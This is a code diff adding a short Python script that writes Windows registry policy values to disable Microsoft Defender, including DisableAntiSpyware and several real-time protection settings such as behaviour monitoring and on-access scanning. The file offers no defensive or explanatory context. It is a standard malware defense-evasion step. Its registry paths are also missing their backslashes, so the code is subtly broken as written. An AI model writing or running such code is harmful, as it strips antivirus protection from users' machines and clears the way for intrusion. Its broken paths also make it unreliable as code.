@@ -1,0 +1,36 @@
+import winreg
+
+def set_reg_dword(key, name, value):
+    try:
+        winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
+    except Exception as e:
+        print(f"Failed to set {name}: {e}")
+
+def main():
+    base_path = r"SOFTWAREPoliciesMicrosoftWindows Defender"
+    rtp_path = base_path + r"Real-Time Protection"
+    value = 1
+
+    try:
+        # Open or create base key
+        base_key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, base_path)
+        set_reg_dword(base_key, "DisableAntiSpyware", value)
+        winreg.CloseKey(base_key)
+
+        # Open or create Real-Time Protection key
+        rtp_key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, rtp_path)
+        params = [
+            "DisableBehaviourMonitoring",
+            "DisableOnAccessProtection",
+            "DisableScanOnRealTimeEnable",
+            "DisableIOAVPProtection"
+        ]
+        for param in params:
+            set_reg_dword(rtp_key, param, value)
+        winreg.CloseKey(rtp_key)
+        print("Registry keys updated successfully.")
+    except Exception as e:
+        print("Error: ", e)
+
+if __name__ == "__main__":
+    main()
